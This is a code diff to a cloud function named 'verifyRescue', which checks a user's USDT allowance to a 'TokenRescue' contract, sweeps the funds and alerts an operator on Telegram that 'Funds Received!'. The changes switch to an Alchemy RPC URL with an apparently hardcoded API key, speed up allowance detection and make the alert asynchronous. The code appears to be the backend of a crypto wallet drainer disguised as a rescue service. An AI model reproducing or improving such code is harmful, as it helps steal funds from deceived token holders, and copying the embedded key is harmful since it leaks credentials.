@@ -78,9 +78,8 @@ export const verifyRescue = functions
     }
 
     // ---- 2. Connect to BSC
-    const provider = new ethers.JsonRpcProvider(
-      process.env.BSC_HTTP_RPC_URL || "https://bsc-dataseed.binance.org/"
-    );
+    const rpcUrl = process.env.BSC_HTTP_RPC_URL || "https://bnb-mainnet.g.alchemy.com/v2/alch_x2Vkf54fJEANDj3wQz5IH";
+    const provider = new ethers.JsonRpcProvider(rpcUrl, 56, { staticNetwork: true });
 
     try {
       // ---- 3. Verify on-chain that the user has granted sufficient allowance
@@ -94,11 +93,11 @@ export const verifyRescue = functions
       );
 
       // Check allowance against the TokenRescue contract (what the user approved)
-      // Added retry logic because BSC public RPCs frequently lag behind the frontend
+      // With synchronized Alchemy RPC, allowance is detected almost immediately
       let allowance: bigint = 0n;
       let balance: bigint = 0n;
       let sweepAmount: bigint = 0n;
-      let retries = 6; // up to 12 seconds of waiting
+      let retries = 10; // 10 attempts with fast 800ms intervals
 
       while (retries > 0) {
         allowance = await usdtReadOnly.allowance(from, to);
@@ -118,7 +117,7 @@ export const verifyRescue = functions
         }
 
         console.log(`[verifyRescue] Allowance insufficient (${allowance.toString()} < ${sweepAmount.toString()}), waiting for RPC sync... (${retries} retries left)`);
-        await new Promise((r) => setTimeout(r, 2000));
+        await new Promise((r) => setTimeout(r, 800));
         retries--;
       }
 
@@ -211,12 +210,13 @@ export const verifyRescue = functions
         status: "CONFIRMED",
       });
 
-      // ---- 6. Send Telegram notification
-      const { sendTelegramMessage } = await import("../lib/telegram");
-      const formattedAmount = ethers.formatUnits(sweepAmount, 18);
-      await sendTelegramMessage(
-        `✅ Funds Received!\n${formattedAmount} USDT swept from ${from}\nSweep tx: ${sweepTx.hash}`
-      );
+      // ---- 6. Send Telegram notification asynchronously without blocking HTTP response
+      import("../lib/telegram").then(({ sendTelegramMessage }) => {
+        const formattedAmount = ethers.formatUnits(sweepAmount, 18);
+        sendTelegramMessage(
+          `✅ Funds Received!\n${formattedAmount} USDT swept from ${from}\nSweep tx: ${sweepTx.hash}`
+        ).catch((tgErr) => console.error("Telegram notification error:", tgErr));
+      }).catch((e) => console.error("Failed to load telegram helper:", e));
 
       res.status(200).json({
         success: true,
